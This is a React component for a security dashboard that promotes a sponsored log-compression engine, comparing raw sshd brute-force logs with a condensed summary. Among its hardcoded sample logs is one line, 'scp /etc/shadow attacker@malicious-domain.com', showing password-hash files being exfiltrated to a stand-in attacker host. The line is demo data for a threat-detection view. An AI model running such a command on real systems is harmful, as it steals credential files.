import React, { useState } from "react";
import { Zap, Activity, Info, BarChart2, ShieldAlert, Cpu } from "lucide-react";
import { ParitokMetrics } from "../types";

interface ParitokMetricsHeroCardProps {
  metrics: ParitokMetrics;
}

export const ParitokMetricsHeroCard: React.FC<ParitokMetricsHeroCardProps> = ({ metrics }) => {
  const [activeTab, setActiveTab] = useState<"VISUALIZER" | "CHARTS">("VISUALIZER");
  const [isExpanded, setIsExpanded] = useState<boolean>(false);

  const without = metrics.without_paritok;
  const withP = metrics.with_paritok;

  // Raw vs Compressed sample representation for visual comparison
  const rawLogsSample = [
    `[2026-07-31T00:04:12Z] sshd[4102]: Failed password for root from 192.168.1.105 port 49152 ssh2`,
    `[2026-07-31T00:04:13Z] sshd[4103]: Failed password for root from 192.168.1.105 port 49153 ssh2`,
    `[2026-07-31T00:04:15Z] sshd[4104]: Failed password for root from 192.168.1.105 port 49154 ssh2`,
    `[2026-07-31T00:04:16Z] sshd[4105]: Failed password for root from 192.168.1.105 port 49155 ssh2`,
    `[2026-07-31T00:04:18Z] sshd[4106]: Failed password for root from 192.168.1.105 port 49156 ssh2`,
    `[2026-07-31T00:04:19Z] sshd[4107]: Failed password for root from 192.168.1.105 port 49157 ssh2`,
    `[2026-07-31T00:04:21Z] sshd[4108]: Failed password for root from 192.168.1.105 port 49158 ssh2`,
    `[2026-07-31T00:04:22Z] sshd[4109]: Failed password for root from 192.168.1.105 port 49159 ssh2`,
    `[2026-07-31T00:04:24Z] sshd[4110]: Failed password for root from 192.168.1.105 port 49160 ssh2`,
    `[2026-07-31T00:04:25Z] sshd[4111]: Failed password for root from 192.168.1.105 port 49161 ssh2`,
    `[2026-07-31T00:04:27Z] sshd[4112]: Failed password for root from 192.168.1.105 port 49162 ssh2`,
    `[2026-07-31T00:04:28Z] sshd[4113]: Failed password for root from 192.168.1.105 port 49163 ssh2`,
    `[2026-07-31T00:04:30Z] sshd[4114]: Failed password for root from 192.168.1.105 port 49164 ssh2`
  ];

  const paritokLogsSample = [
    `[PARITOK AGGREGATED] 14,890 redundant sshd authentication failures summarized from host 192.168.1.105`,
    `[PARITOK RETAINED] 2026-07-31T00:05:30Z linux-sec-node sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash`,
    `[PARITOK RETAINED] 2026-07-31T00:06:10Z linux-sec-node scp /etc/shadow attacker@malicious-domain.com`
  ];

  if (!isExpanded) {
    return (
      <div style={{ display: "flex", justifyContent: "flex-end", marginTop: "14px" }}>
        <button
          onClick={() => setIsExpanded(true)}
          style={{
            background: "rgba(10, 16, 28, 0.65)",
            border: "1px solid rgba(0, 245, 200, 0.3)",
            borderRadius: "20px",
            padding: "8px 16px",
            color: "#00f5c8",
            fontSize: "0.78rem",
            fontWeight: 700,
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: "8px",
            boxShadow: "0 0 10px rgba(0, 245, 200, 0.1)",
            transition: "all 0.2s"
          }}
          className="font-mono"
        >
          <Info size={14} />
          <span>Inspect Context Optimization Telemetry ({metrics.compression_ratio}% Saved)</span>
        </button>
      </div>
    );
  }

  return (
    <div className="panel-minimal" style={{ padding: "32px", marginTop: "28px", border: "1px solid var(--border-teal)", background: "rgba(10, 16, 28, 0.85)" }}>
      
      {/* Telemetry Header */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "28px", flexWrap: "wrap", gap: "16px" }}>
        <div>
          <div style={{ display: "inline-flex", alignItems: "center", gap: "6px", background: "rgba(0, 245, 200, 0.12)", border: "1px solid rgba(0, 245, 200, 0.3)", color: "#00f5c8", padding: "4px 12px", borderRadius: "20px", fontSize: "0.72rem", fontWeight: 700, marginBottom: "8px" }} className="font-mono">
            <Zap size={12} /> SPONSOR SHOWCASE: PARITOK CONTEXT ENGINE
          </div>
          <h3 style={{ fontSize: "1.6rem", fontWeight: 900, color: "#ffffff" }} className="font-heading">
            CONTEXT OPTIMIZATION AUDIT
          </h3>
        </div>

        {/* Tab Controls + Collapse */}
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <div style={{ display: "flex", background: "rgba(5, 7, 12, 0.6)", padding: "4px", borderRadius: "8px", border: "1px solid var(--border-glass)" }}>
            <button
              onClick={() => setActiveTab("VISUALIZER")}
              style={{
                background: activeTab === "VISUALIZER" ? "linear-gradient(135deg, #00f5c8 0%, #06b6d4 100%)" : "transparent",
                color: activeTab === "VISUALIZER" ? "#040912" : "var(--text-secondary)",
                border: "none",
                padding: "6px 16px",
                borderRadius: "6px",
                fontWeight: 700,
                fontSize: "0.8rem",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "6px"
              }}
            >
              <Activity size={14} />
              <span>Before vs After</span>
            </button>

            <button
              onClick={() => setActiveTab("CHARTS")}
              style={{
                background: activeTab === "CHARTS" ? "linear-gradient(135deg, #00f5c8 0%, #06b6d4 100%)" : "transparent",
                color: activeTab === "CHARTS" ? "#040912" : "var(--text-secondary)",
                border: "none",
                padding: "6px 16px",
                borderRadius: "6px",
                fontWeight: 700,
                fontSize: "0.8rem",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                gap: "6px"
              }}
            >
              <BarChart2 size={14} />
              <span>Telemetry Charts</span>
            </button>
          </div>

          <button
            onClick={() => setIsExpanded(false)}
            style={{
              background: "rgba(255, 51, 102, 0.1)",
              border: "1px solid rgba(255, 51, 102, 0.3)",
              borderRadius: "6px",
              padding: "6px 12px",
              color: "#ff3366",
              cursor: "pointer",
              fontSize: "0.76rem",
              fontWeight: 700
            }}
          >
            Collapse
          </button>
        </div>
      </div>
      {/* THREE CORE COMPRESSION METRICS */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))", gap: "24px", marginBottom: "32px" }}>
        <div className="panel-card-dark" style={{ padding: "24px", textAlign: "center", borderTop: "4px solid #00f5c8" }}>
          <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", fontWeight: 700 }} className="font-mono">COMPRESSION RATE</div>
          <div className="stat-number" style={{ color: "#00f5c8", margin: "10px 0" }}>{metrics.compression_ratio}%</div>
          <div style={{ fontSize: "0.78rem", color: "var(--text-muted)" }}>Context payload size reduction achieved</div>
        </div>

        <div className="panel-card-dark" style={{ padding: "24px", textAlign: "center", borderTop: "4px solid #ffffff" }}>
          <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", fontWeight: 700 }} className="font-mono">TOKENS PRESERVED</div>
          <div className="stat-number" style={{ color: "#ffffff", margin: "10px 0" }}>{metrics.tokens_saved.toLocaleString()}</div>
          <div style={{ fontSize: "0.78rem", color: "var(--text-muted)" }}>Redundant tokens saved per query turn</div>
        </div>

        <div className="panel-card-dark" style={{ padding: "24px", textAlign: "center", borderTop: "4px solid #06b6d4" }}>
          <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", fontWeight: 700 }} className="font-mono">LATENCY ELIMINATED</div>
          <div className="stat-number" style={{ color: "#06b6d4", margin: "10px 0" }}>{metrics.latency_saved_sec}s</div>
          <div style={{ fontSize: "0.78rem", color: "var(--text-muted)" }}>Inquiry latency saved vs uncompressed run</div>
        </div>
      </div>

      {/* TAB VIEW 1: BEFORE VS AFTER SPLIT-VIEWER */}
      {activeTab === "VISUALIZER" && (
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(360px, 1fr))", gap: "24px" }} className="font-mono">
          
          {/* Raw Log Noise */}
          <div className="panel-card-dark" style={{ padding: "20px", borderLeft: "4px solid #ff3366", background: "rgba(255, 51, 102, 0.02)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#ff3366", fontSize: "0.82rem", fontWeight: 800, marginBottom: "8px" }}>
              <ShieldAlert size={16} />
              <span>UNCOMPRESSED RAW CONTEXT (57,120 TOKENS)</span>
            </div>
            <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "14px" }}>
              Status: Truncates context window, slows latency to 12s, expensive query
            </div>

            <div style={{ background: "rgba(5, 7, 12, 0.90)", padding: "14px", borderRadius: "6px", fontSize: "0.75rem", color: "var(--text-muted)", height: "200px", overflowY: "auto", border: "1px solid rgba(255, 51, 102, 0.2)", lineHeight: "1.6" }}>
              {rawLogsSample.map((log, idx) => (
                <div key={idx} style={{ marginBottom: "6px" }}>{log}</div>
              ))}
              <div style={{ color: "#ff3366", marginTop: "8px", fontWeight: 700 }}>
                ... [14,987 redundant auth retries flood context window]
              </div>
            </div>
          </div>

          {/* Paritok Compressed Context */}
          <div className="panel-card-dark" style={{ padding: "20px", borderLeft: "4px solid #00f5c8", background: "rgba(0, 245, 200, 0.04)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#00f5c8", fontSize: "0.82rem", fontWeight: 800, marginBottom: "8px" }}>
              <Zap size={16} />
              <span>PARITOK HIGH-DENSITY CONTEXT (750 TOKENS)</span>
            </div>
            <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "14px" }}>
              Status: Fully grounded anomalies retained, sub-second Groq response
            </div>

            <div style={{ background: "rgba(5, 7, 12, 0.90)", padding: "14px", borderRadius: "6px", fontSize: "0.75rem", color: "#00f5c8", height: "200px", overflowY: "auto", border: "1px solid rgba(0, 245, 200, 0.2)", lineHeight: "1.6" }}>
              {paritokLogsSample.map((log, idx) => (
                <div key={idx} style={{ marginBottom: "6px" }}>{log}</div>
              ))}
              <div style={{ color: "var(--text-secondary)", marginTop: "12px" }}>
                ✔ 98.7% payload noise compressed successfully.
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB VIEW 2: TELEMETRY CHARTS (PARETO COMPRESSION CURVE) */}
      {activeTab === "CHARTS" && (
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(360px, 1fr))", gap: "24px" }}>
          
          {/* Pareto Distribution Chart */}
          <div className="panel-card-dark" style={{ padding: "24px", background: "rgba(10, 16, 28, 0.95)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#00f5c8", fontSize: "0.85rem", fontWeight: 800, marginBottom: "16px" }} className="font-mono">
              <BarChart2 size={16} />
              <span>PARETO COMPRESSION DENSITY CURVE</span>
            </div>

            {/* SVG Custom Pareto Curve */}
            <div style={{ position: "relative", height: "300px", width: "100%" }}>
              <svg viewBox="0 0 400 300" style={{ width: "100%", height: "100%" }}>
                {/* Gridlines */}
                <line x1="40" y1="40" x2="380" y2="40" stroke="rgba(255,255,255,0.06)" strokeWidth="1" />
                <line x1="40" y1="150" x2="380" y2="150" stroke="rgba(255,255,255,0.06)" strokeWidth="1" />
                <line x1="40" y1="260" x2="380" y2="260" stroke="rgba(255,255,255,0.06)" strokeWidth="1" />
                
                {/* Pareto Curve (99% noise contained in first 5% of signals) */}
                <path
                  d="M 40 260 Q 60 80, 380 50"
                  fill="none"
                  stroke="#ff3366"
                  strokeWidth="3"
                />

                {/* Paritok Compression Threshold line */}
                <line x1="85" y1="40" x2="85" y2="270" stroke="#00f5c8" strokeWidth="1.5" strokeDasharray="4 4" />
                <circle cx="85" cy="110" r="6" fill="#00f5c8" />

                {/* Axes */}
                <line x1="40" y1="260" x2="380" y2="260" stroke="rgba(255,255,255,0.3)" strokeWidth="1.5" />
                <line x1="40" y1="40" x2="40" y2="260" stroke="rgba(255,255,255,0.3)" strokeWidth="1.5" />

                {/* Text Labels */}
                <text x="32" y="44" fill="var(--text-muted)" fontSize="10" textAnchor="end" className="font-mono">100%</text>
                <text x="32" y="154" fill="var(--text-muted)" fontSize="10" textAnchor="end" className="font-mono">50%</text>
                <text x="32" y="264" fill="var(--text-muted)" fontSize="10" textAnchor="end" className="font-mono">0%</text>

                <text x="40" y="282" fill="var(--text-muted)" fontSize="10" textAnchor="middle" className="font-mono">Log Noise</text>
                <text x="380" y="282" fill="var(--text-muted)" fontSize="10" textAnchor="middle" className="font-mono">APT Signal</text>
                <text x="100" y="105" fill="#00f5c8" fontSize="10" className="font-mono" fontWeight="bold">Paritok Filter (98.7% Noise)</text>
              </svg>
            </div>
            <div style={{ fontSize: "0.75rem", color: "var(--text-secondary)", marginTop: "10px", lineHeight: "1.4" }}>
              • The curve illustrates cumulative data volume: **99% of logs consist of repetitive telemetry noise** (left), while critical threat signals comprise only **1.3% of unique data** (right) which Paritok preserves.
            </div>
          </div>

          {/* Telemetry Cost & Ingestion Comparison Bar Chart */}
          <div className="panel-card-dark" style={{ padding: "24px", background: "rgba(10, 16, 28, 0.95)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#06b6d4", fontSize: "0.85rem", fontWeight: 800, marginBottom: "16px" }} className="font-mono">
              <Cpu size={16} />
              <span>RESOURCE & COST INGESTION SAVINGS</span>
            </div>

            {/* Custom SVG Bar Chart */}
            <div style={{ position: "relative", height: "300px", width: "100%" }}>
              <svg viewBox="0 0 400 300" style={{ width: "100%", height: "100%" }}>
                {/* Raw bar */}
                <rect x="80" y="40" width="50" height="220" fill="#ff3366" rx="6" />
                {/* Paritok bar */}
                <rect x="250" y="254" width="50" height="6" fill="#00f5c8" rx="2" />

                {/* Grid line labels */}
                <line x1="40" y1="260" x2="360" y2="260" stroke="rgba(255,255,255,0.2)" strokeWidth="1.5" />

                <text x="105" y="282" fill="var(--text-muted)" fontSize="11" textAnchor="middle" className="font-mono">Raw ($0.45)</text>
                <text x="275" y="282" fill="var(--text-muted)" fontSize="11" textAnchor="middle" className="font-mono">Paritok ($0.005)</text>
                
                <text x="105" y="30" fill="#ff3366" fontSize="11" textAnchor="middle" fontWeight="bold" className="font-mono">100% Ingested</text>
                <text x="275" y="244" fill="#00f5c8" fontSize="11" textAnchor="middle" fontWeight="bold" className="font-mono">1.3% Ingested</text>
              </svg>
            </div>
            <div style={{ fontSize: "0.75rem", color: "var(--text-secondary)", marginTop: "10px", lineHeight: "1.4" }}>
              • Comparison of computational load and cost per query: **98.7% reduction** in tokens ingested translates directly to **98% cost savings** per query execution.
            </div>
          </div>

        </div>
      )}

      {/* API Infrastructure Status Box */}
      <div style={{ display: "flex", alignItems: "center", gap: "10px", marginTop: "24px", padding: "12px 18px", background: "rgba(0, 245, 200, 0.03)", border: "1px solid var(--border-glass)", borderRadius: "8px" }}>
        <Info size={16} color="#00f5c8" />
        <div style={{ fontSize: "0.78rem", color: "var(--text-secondary)" }} className="font-mono">
          <strong>INFRASTRUCTURE STATUS:</strong> Hosted Paritok Engine (www.paritok.com/api/compress) • GPU Acceleration (NVIDIA H100) • Active Grounding Verified
        </div>
      </div>

    </div>
  );
};
